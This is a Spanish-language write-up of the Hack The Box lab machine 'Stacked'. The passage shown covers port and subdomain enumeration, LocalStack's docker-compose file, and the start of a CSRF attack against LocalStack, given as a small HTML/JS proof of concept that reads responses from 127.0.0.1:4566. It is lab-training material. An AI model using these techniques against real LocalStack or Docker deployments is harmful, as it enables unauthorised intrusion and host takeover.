<!doctype html><html lang=es><head><title>Stacked | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Hack The Box. Linux. Máquina insana. Esta máquina contiene un entorno de LocalStack que es vulnerable a CSRF e inyección de comandos. Al descubrir una vulnerabilidad de XSS en un subdominio, podemos utilizar CSRF para explotar la vulnerabilidad de inyección de comandos y conseguir RCE en un contenedor. Después de escalar privilegios en el contenedor mediante el reinicio de un servicio e introduciendo un comando malicioso, podemos interactuar con Docker en la máquina anfitrión y crear un contenedor malicioso a partir de scratch que monta el sistema de archivos de la máquina en el contenedor para conseguir lectura y escritura arbitraria de archivos. Para comprometer esta máquina se necesitan técnicas de explotación web y conocimientos avanzados de Docker"><meta name=robots content="index, follow"><meta name=image content="https://7rocky.github.io/images/HTB/Stacked/Stacked.png"><meta name=author content="7Rocky"><meta property="og:title" content="Stacked"><meta property="og:description" content="Hack The Box. Linux. Máquina insana. Esta máquina contiene un entorno de LocalStack que es vulnerable a CSRF e inyección de comandos. Al descubrir una vulnerabilidad de XSS en un subdominio, podemos utilizar CSRF para explotar la vulnerabilidad de inyección de comandos y conseguir RCE en un contenedor. Después de escalar privilegios en el contenedor mediante el reinicio de un servicio e introduciendo un comando malicioso, podemos interactuar con Docker en la máquina anfitrión y crear un contenedor malicioso a partir de scratch que monta el sistema de archivos de la máquina en el contenedor para conseguir lectura y escritura arbitraria de archivos. Para comprometer esta máquina se necesitan técnicas de explotación web y conocimientos avanzados de Docker"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/htb/stacked/"><meta property="article:section" content="htb"><meta property="article:published_time" content="2022-03-19T00:00:00+01:00"><meta property="article:modified_time" content="2022-03-30T19:08:29+02:00"><meta property="og:site_name" content="7Rocky"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Stacked/Stacked.png"><meta property="og:author" content="7Rocky"><meta itemprop=name content="Stacked"><meta itemprop=description content="Hack The Box. Linux. Máquina insana. Esta máquina contiene un entorno de LocalStack que es vulnerable a CSRF e inyección de comandos. Al descubrir una vulnerabilidad de XSS en un subdominio, podemos utilizar CSRF para explotar la vulnerabilidad de inyección de comandos y conseguir RCE en un contenedor. Después de escalar privilegios en el contenedor mediante el reinicio de un servicio e introduciendo un comando malicioso, podemos interactuar con Docker en la máquina anfitrión y crear un contenedor malicioso a partir de scratch que monta el sistema de archivos de la máquina en el contenedor para conseguir lectura y escritura arbitraria de archivos. Para comprometer esta máquina se necesitan técnicas de explotación web y conocimientos avanzados de Docker"><meta itemprop=datePublished content="2022-03-19T00:00:00+01:00"><meta itemprop=dateModified content="2022-03-30T19:08:29+02:00"><meta itemprop=wordCount content="3425"><meta itemprop=keywords content="cve,docker,xss,volumes,command-injection,csrf,rce,"><meta name=twitter:card content="summary"><meta name=twitter:title content="Stacked"><meta name=twitter:description content="Hack The Box. Linux. Máquina insana. Esta máquina contiene un entorno de LocalStack que es vulnerable a CSRF e inyección de comandos. Al descubrir una vulnerabilidad de XSS en un subdominio, podemos utilizar CSRF para explotar la vulnerabilidad de inyección de comandos y conseguir RCE en un contenedor. Después de escalar privilegios en el contenedor mediante el reinicio de un servicio e introduciendo un comando malicioso, podemos interactuar con Docker en la máquina anfitrión y crear un contenedor malicioso a partir de scratch que monta el sistema de archivos de la máquina en el contenedor para conseguir lectura y escritura arbitraria de archivos. Para comprometer esta máquina se necesitan técnicas de explotación web y conocimientos avanzados de Docker"><meta name=twitter:image content="https://7rocky.github.io/images/HTB/Stacked/Stacked.png"><meta name=twitter:author content="7Rocky"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><link href=/css/main.css rel=stylesheet><script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script><script src=/js/main.js></script><div style=display:none>$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$</div></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href title=es><img alt=es height=30px src=/images/es.png width=30px></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href=/en/htb/stacked/ title=en><img alt=en height=30px src=/images/en.png style="border:4px solid#000;border-radius:100%" width=30px></a><ul class="pl0 ml3 mr3"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/stacked/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/stacked/&text=Stacked" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/stacked/&title=Stacked" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Stacked</h1><time class="f6 mv4 dib tracked" datetime=2022-03-19T00:00:00+01:00>19 / 03 / 2022</time></header><div class=htb-image><img alt=Stacked src=/images/HTB/Stacked/Stacked.png></div><ul class="nested-links tags"><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/cve title=CVE>CVE</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/docker title=Docker>Docker</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/xss title="Cross-Site Scripting">Cross-Site Scripting</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/volumes title="Montajes de volumen">Montajes de volumen</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/command-injection title="Inyección de Comandos">Inyección de Comandos</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/csrf title="Cross-Site Request Forgery">Cross-Site Request Forgery</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/rce title="Ejecución remota de comandos">Ejecución remota de comandos</a></li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#comprometiendo-localstack-_proxy_-mitm>Comprometiendo LocalStack. <em>Proxy</em> MITM</a></li><li><a href=#comprometiendo-localstack-rce>Comprometiendo LocalStack. RCE</a></li><li><a href=#encontrando-un-xss>Encontrando un XSS</a></li><li><a href=#intrusión-en-el-contenedor>Intrusión en el contenedor</a></li><li><a href=#enumeración-del-sistema>Enumeración del sistema</a></li><li><a href=#escalada-de-privilegios-en-el-contenedor>Escalada de privilegios en el contenedor</a></li><li><a href=#escalada-de-privilegios-en-la-máquina>Escalada de privilegios en la máquina</a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Insana</li><li><strong>Dirección IP</strong>: 10.10.11.112</li><li><strong>Fecha</strong>: 26 / 02 / 2022</li></ul><h2 id=escaneo-de-puertos>Escaneo de puertos</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.112 -p 22,80,2376
</span></span><span style=display:flex><span>Nmap scan report for 10.10.11.112
</span></span><span style=display:flex><span>Host is up (0.051s latency).
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE     VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   3072 12:8f:2b:60:bc:21:bd:db:cb:13:02:03:ef:59:36:a5 (RSA)
</span></span><span style=display:flex><span>|   256 af:f3:1a:6a:e7:13:a9:c0:25:32:d0:2c:be:59:33:e4 (ECDSA)
</span></span><span style=display:flex><span>|_  256 39:50:d5:79:cd:0e:f0:24:d3:2c:f4:23:ce:d2:a6:f2 (ED25519)
</span></span><span style=display:flex><span>80/tcp   open  http        Apache httpd 2.4.41
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></span><span style=display:flex><span>|_http-title: STACKED.HTB
</span></span><span style=display:flex><span>2376/tcp open  ssl/docker?
</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName=0.0.0.0
</span></span><span style=display:flex><span>| Subject Alternative Name: DNS:localhost, DNS:stacked, IP Address:0.0.0.0, IP Address:127.0.0.1, IP Address:172.17.0.1
</span></span><span style=display:flex><span>| Not valid before: 2021-07-17T15:37:02
</span></span><span style=display:flex><span>|_Not valid after:  2022-07-17T15:37:02
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 19.38 seconds
</span></span></code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 2376 (Docker).</p><h2 id=enumeración-web>Enumeración web</h2><p>Existe un dominio llamado <code>stacked.htb</code> como se muestra en la salida de <code>nmap</code>, por lo que podemos ponerlo en <code>/etc/hosts</code>. Además, <code>http://10.10.11.112</code> redirige a <code>http://stacked.htb</code>. Si vamos a esta dirección, veremos una página web como esta:</p><p><img src=/images/HTB/Stacked/Stacked-index.png alt="Stacked landing page"></p><p>No hay nada que ver aquí. Podemos aplicar <em>fuzzing</em> para enumerar más rutas:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://stacked.htb/FUZZ  
images                  [Status: <span class=code-dark-blue>301</span>, Size: 311, Words: 20, Lines: 10]
css                     [Status: <span class=code-dark-blue>301</span>, Size: 308, Words: 20, Lines: 10]
js                      [Status: <span class=code-dark-blue>301</span>, Size: 307, Words: 20, Lines: 10]
fonts                   [Status: <span class=code-dark-blue>301</span>, Size: 310, Words: 20, Lines: 10]
                        [Status: <span class=code-dark-green>200</span>, Size: 5055, Words: 367, Lines: 159]
sass                    [Status: <span class=code-dark-blue>301</span>, Size: 309, Words: 20, Lines: 10]
server-status           [Status: <span class=code-dark-yellow>403</span>, Size: 276, Words: 20, Lines: 10]
</code></pre></div><p>Pero nada interesante.</p><p>Si tratamos de conectarnos al puerto 2376 con <code>curl</code> descubrimos que se necesitan certificados de cliente:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -k https://10.10.11.112:2376
curl: (56) OpenSSL SSL_read: error:14094412:SSL routines:ssl3_read_bytes:sslv3 alert bad certificate, errno 0  
</code></pre></div><p>Tras in proceso de investigación, vemos que el puerto 2376 es utilizado por Docker cuando se configura para ser usado de forma remota desde otras máquinas. Este es el motivo por el que necesita certificados de cliente, como método de autenticación.</p><p>De momento, vamos a continuar enumerando subdominios:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.112 -H <span class=code-dark-yellow>'Host: FUZZ.stacked.htb'</span> -fc 302  
portfolio               [Status: <span class=code-dark-green>200</span>, Size: 30268, Words: 11467, Lines: 445]
</code></pre></div><p>Una vez configurado el subdominio en <code>/etc/hosts</code>, podemos ir a <code>http://portfolio.stacked.htb</code> y ver la siguiente página web:</p><p><img src=/images/HTB/Stacked/Stacked-portfolio.png alt="Stacked portfolio"></p><p>Aquí podemos descargar un archivo llamado <code>docker-compose.yml</code> que arranca un entorno de LocalStack para simular AWS en local:</p><p><img src=/images/HTB/Stacked/Stacked-docker.png alt="Stacked docker"></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>version</span><span class=mtk1>:</span> <span class=mtk4>"3.3"</span>

<span class=mtk5>services</span><span class=mtk1>:</span>
  <span class=mtk5>localstack</span><span class=mtk1>:</span>
    <span class=mtk5>container_name</span><span class=mtk1>:</span> <span class=mtk4>"${LOCALSTACK_DOCKER_NAME-localstack_main}"</span>
    <span class=mtk5>image</span><span class=mtk1>:</span> <span class="mtk4 detected-link">localstack/localstack-full</span><span class=mtk4>:0.12.6</span>
    <span class=mtk5>network_mode</span><span class=mtk1>:</span> <span class=mtk4>bridge</span>
    <span class=mtk5>ports</span><span class=mtk1>:</span>
      <span class=mtk1>-</span> <span class=mtk4>"127.0.0.1:443:443"</span>
      <span class=mtk1>-</span> <span class=mtk4>"127.0.0.1:4566:4566"</span>
      <span class=mtk1>-</span> <span class=mtk4>"127.0.0.1:4571:4571"</span>
      <span class=mtk1>-</span> <span class=mtk4>"127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}</span><span class=mtk4>"</span>
    <span class=mtk5>environment</span><span class=mtk1>:</span>
      <span class=mtk1>-</span> <span class=mtk4>SERVICES=serverless</span>
      <span class=mtk1>-</span> <span class=mtk4>DEBUG=1</span>
      <span class=mtk1>-</span> <span class=mtk4>DATA_DIR=/var/localstack/data</span>
      <span class=mtk1>-</span> <span class=mtk4>PORT_WEB_UI=${PORT_WEB_UI-</span> <span class=mtk4>}</span>
      <span class=mtk1>-</span> <span class=mtk4>LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR-</span> <span class=mtk4>}</span>
      <span class=mtk1>-</span> <span class=mtk4>LOCALSTACK_API_KEY=${LOCALSTACK_API_KEY-</span> <span class=mtk4>}</span>
      <span class=mtk1>-</span> <span class=mtk4>KINESIS_ERROR_PROBABILITY=${KINESIS_ERROR_PROBABIL</span><span class=mtk4>ITY-</span> <span class=mtk4>}</span>  
      <span class=mtk1>-</span> <span class=mtk4>DOCKER_HOST=unix:///var/run/docker.sock</span>
      <span class=mtk1>-</span> <span class=mtk4>HOST_TMP_FOLDER="/tmp/localstack"</span>
    <span class=mtk5>volumes</span><span class=mtk1>:</span>
      <span class=mtk1>-</span> <span class=mtk4>"/tmp/localstack:/tmp/localstack"</span>
      <span class=mtk1>-</span> <span class=mtk4>"/var/run/docker.sock:/var/run/docker.sock"</span>
</code></pre></div><p>Este archivo configura un contenedor que expone puertos 443, 4566, 4571 y 8080 para interactuar con LocalStack. Podemos arrancarlo usando <code>docker-compose up</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>docker-compose</span> up
[+] Running 1/0
 <span class=code-dark-blue>⠿ Container localstack_main  Created                                                                                                                    0.0s</span>  
Attaching to localstack_main
<span class=code-dark-cyan>localstack_main  |</span> Waiting for all LocalStack services to be ready
...
<span class=code-dark-cyan>localstack_main  |</span> Ready.
<span class=code-dark-cyan>localstack_main  |</span> INFO:localstack.utils.analytics.profiler: Execution of "start_api_services" took 27272.037982940674ms
</code></pre></div><p>Y tenemos ya todos los servicios preparados:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> localhost:4566  
{"status": "running"}
</code></pre></div><p><img src=/images/HTB/Stacked/Stacked-localstack-infra.png alt="Stacked localstack infra"></p><p><img src=/images/HTB/Stacked/Stacked-localstack-shell.png alt="Stacked localstack shell"></p><h2 id=comprometiendo-localstack-_proxy_-mitm>Comprometiendo LocalStack. <em>Proxy</em> MITM</h2><p>Es posible instalar un <em>proxy</em> MITM y controlar tanto peticiones como respuestas de LocalStack. Esto se explica en <a href=https://blog.sonarsource.com/hack-the-stack-with-localstack>SonarSource</a> y <a href=https://portswigger.net/daily-swig/localstack-zero-day-vulnerabilities-chained-to-achieve-remote-takeover-of-local-instances>PortSwigger</a>. Aunque el ataque está bien explicado, no hay ningún <em>exploit</em> disponible, por lo que tenemos que escribirlo a mano.</p><p>El primer paso es un <em>Cross-Site Request Forgery</em> (CSRF). El objetivo es que la víctuma acceda a nuestra página web maliciosa y que esta web realice una petición a <code>http://127.0.0.1:4566</code> para hablar con LocalStack y configurar algunas variables.</p><p>LocalStack permite <em>Cross-Origin Resource Sharing</em> (CORS) a cualquier origen, por lo que <em>Same-Origin Policy</em> no nos bloqueará y podremos leer las respuestas de LocalStack.</p><p>Vamos a comenzar creando un simple archivo <code>index.html</code> que llame a al <em>script</em> <code>csrf.js</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>&lt;!</span><span class=mtk5>doctype</span> <span class=mtk8>html</span><span class=mtk1>&gt;</span>
<span class=mtk1>&lt;</span><span class=mtk5>html</span><span class=mtk1>&gt;</span>
  <span class=mtk1>&lt;</span><span class=mtk5>head</span><span class=mtk1>&gt;</span>
    <span class=mtk1>&lt;</span><span class=mtk5>title</span><span class=mtk1>&gt;LocalStack</span> <span class=mtk1>Exploit&lt;/</span><span class=mtk5>title</span><span class=mtk1>&gt;</span>  
    <span class=mtk1>&lt;</span><span class=mtk5>meta</span> <span class=mtk8>charset</span><span class=mtk1>=</span><span class=mtk4>"utf-8"</span><span class=mtk1>&gt;</span>
  <span class=mtk1>&lt;/</span><span class=mtk5>head</span><span class=mtk1>&gt;</span>
  <span class=mtk1>&lt;</span><span class=mtk5>body</span><span class=mtk1>&gt;</span>
    <span class=mtk1>&lt;</span><span class=mtk5>script</span> <span class=mtk8>src</span><span class=mtk1>=</span><span class=mtk4>"</span><span class="mtk4 detected-link">csrf.js</span><span class=mtk4>"</span><span class=mtk1>&gt;&lt;/</span><span class=mtk5>script</span><span class=mtk1>&gt;</span>
  <span class=mtk1>&lt;/</span><span class=mtk5>body</span><span class=mtk1>&gt;</span>
<span class=mtk1>&lt;/</span><span class=mtk5>html</span><span class=mtk1>&gt;</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk7>fetch</span><span class=mtk1>(</span><span class=mtk4>'</span><span class="mtk4 detected-link">http://127.0.0.1:4566</span><span class=mtk4>'</span><span class=mtk1>)</span>  
  <span class=mtk1>.</span><span class=mtk8>then</span><span class=mtk1>(</span><span class="mtk9 mtki">res</span> <span class="mtk7 mtki">=&gt;</span> <span class="mtk9 mtki">res</span><span class=mtk1>.</span><span class=mtk8>text</span><span class=mtk1>())</span>
  <span class=mtk1>.</span><span class=mtk8>then</span><span class=mtk1>(</span><span class=mtk1>console</span><span class=mtk1>.</span><span class=mtk8>log</span><span class=mtk1>)</span>
</code></pre></div><p>Este es un modo sencillo de ver si recibimos la respuesta de LocalStack mediante CSRF. Iniciamos un servidor web con Python en el puerto 8000 y accedemos a la página web maliciosa en <code>172.16.33.1:8000</code> (simulando que la víctima accede a la página web maliciosa):</p><p><img src=/images/HTB/Stacked/Stacked-localstack-csrf.png alt="LocalStack CSRF"></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>$ python3 -m http.server 8000
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
::ffff:172.16.33.1 - - [] "GET / HTTP/1.1" 200 -
::ffff:172.16.33.1 - - [] "GET /csrf.js HTTP/1.1" 200 -
::ffff:172.16.33.1 - - [] "GET /csrf.js HTTP/1.1" 200 -
::ffff:172.16.33.1 - - [] code 404, message File not found
::ffff:172.16.33.1 - - [] "GET /favicon.ico HTTP/1.1" 404 -  
